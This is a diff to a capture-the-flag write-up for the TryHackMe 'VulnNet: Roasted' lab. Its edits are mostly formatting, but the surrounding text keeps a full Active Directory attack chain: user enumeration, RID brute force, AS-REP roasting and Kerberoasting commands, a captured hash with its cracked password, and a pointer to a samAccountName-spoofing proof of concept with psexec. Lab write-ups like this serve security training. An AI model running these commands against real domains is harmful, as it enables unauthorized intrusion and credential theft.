@@ -9,11 +9,11 @@ tags: [tryhackme, 'VulnNet: Roasted', Easy]
 
 ### LAB info
 link : https://tryhackme.com/room/vulnnetroasted
+
 Difficulty : Easy
 
 ### Nmap discover open port
 
-1. nmap 
 
 ```bash
 nmap -sCV -Pn 10.48.146.159 -p- 
@@ -48,7 +48,7 @@ Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 ### kerbrute username
 
-2. try to brute force for the username 
+try to brute force for the username 
 
 ```bash
 ./kerbrute_linux_amd64 userenum --dc vulnnet-rst.local -d vulnnet-rst.local /usr/share/seclists/Usernames/Names/names.txt -v
@@ -63,7 +63,7 @@ try with other wordlist
 
 guest@vulnnet-rst.local
 
-3. try with smb 
+### SMB enumeration
 
 ```bash
 netexec smb vulnnet-rst.local -u guest -p '' --shares
@@ -77,7 +77,7 @@ smbclient //vulnnet-rst.local/VulnNet-Business-Anonymous -U vulnnet-rst.local/gu
 
 ### RID bruteforce
 
-4.  rid is the last few digit in the SID usch 500 administrator 
+rid is the last few digit in the SID usch 500 administrator 
 
 so this is to bruteforce form 500 - 1111 to look for the any user 
 ```bash
@@ -97,9 +97,9 @@ j-leet
 
 ###  AS-REP Roasting attack
 
-5.  try performing AS-REP Roasting incase the user we get have pre-authentication disable 
+try performing AS-REP Roasting incase the user we get have pre-authentication disable 
 
-### The 2-Step Ticket Booth Exchange
+#### The 2-Step Ticket Booth Exchange
 
 ```
 [ Your Computer ] ───────────────── AS-REQ ────────────────> [ Domain Controller ]
@@ -117,6 +117,8 @@ j-leet
 SO this attack is perfrom if the user have pre-authentication turned off so it can just enter the domain without password and the domain controller will hand it a TGT which encrypted with the user password and we can crack offline . 
 
 get npu - no preauthentication user 
+
+
 ```bash
 impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile user.txt -dc-ip 10.48.147.26 
 ```
@@ -137,7 +139,7 @@ $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:a25c3ba29877014983d84fc96926238a$9ab046b4
 
 ### Crack 
 
-6. now hashcat crack it 
+now hashcat crack it 
 
 ```cmd 
 hashcat.exe -m 18200 ..\hash.txt ..\rockyou.txt
@@ -150,7 +152,7 @@ tj072889*
 
 ### bloodhound
 
-7. now check with ldap if can we can bloodhound dump 
+now check with ldap if can we can bloodhound dump 
 
 ```bash
 netexec ldap vulnnet-rst.local -u 't-skid' -p 'tj072889*' --port 389 --users
@@ -166,7 +168,7 @@ bloodhound-ce-python -u 't-skid' -p 'tj072889*' -d vulnnet-rst.local -dc WIN-2BO
 
 ### kerberos attacks
 
-8. when look for kerberoastable i found the service  account enterprise-core-vn
+when look for kerberoastable i found the service  account enterprise-core-vn
 
 ```bash
 impacket-GetUserSPNs 'vulnnet-rst.local/t-skid:tj072889*' -dc-ip 10.48.147.26 request
@@ -227,7 +229,7 @@ https://medium.com/@mvelazco/hunting-for-samaccountname-spoofing-cve-2021-42287-
 
 ### get the POC
 
-10. then i go donwload the poc
+then i go donwload the poc
 
 https://github.com/safebuffer/sam-the-admin/tree/main
 
@@ -244,6 +246,5 @@ psexec will upload a file on the target machine so can cd and may be detected
 
 ### Root flag
 
-11. finally 
-we get the root flag
+finally we get the root flag
 ![Image9](/assets/images/THM/VulnNetRoasted/VulnetRoasted-9.png)
